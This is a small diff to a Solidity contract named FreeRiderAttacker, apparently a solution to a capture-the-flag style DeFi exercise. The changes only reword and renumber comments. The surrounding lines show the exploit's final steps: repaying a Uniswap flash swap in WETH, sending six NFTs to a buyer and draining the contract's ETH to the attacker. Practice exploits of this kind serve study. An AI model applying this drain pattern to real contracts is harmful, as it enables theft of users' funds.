@@ -4,7 +4,8 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 
-// As interface for avoiding pragma mismatch. Also saves gas.
+// Imported as interface instead of contract to avoid pragma mismatch.
+// Also saves some gas.
 interface IWETH {
     function deposit() external payable;
 
@@ -81,15 +82,15 @@ contract FreeRiderAttacker {
         // 5. get WETH to pay back the flash swap
         WETH.deposit{value: _repayAmount}();
 
-        // 5. Pay back the flash swap with fee included
+        // 6. Pay back the flash swap with fee included
         WETH.transfer(address(UNISWAP_PAIR), _repayAmount);
 
-        // 6. Send NFT's to buyer
+        // 7. Send NFT's to buyer
         for (uint256 i = 0; i < 6; i++) {
             NFT.safeTransferFrom(address(this), buyer, tokenIds[i]);
         }
 
-        // 7. Transfer ETH to attacker
+        // 8. Transfer ETH to attacker
         (bool ethSent, ) = attacker.call{value: address(this).balance}("");
         require(nftsBought && ethSent);
     }
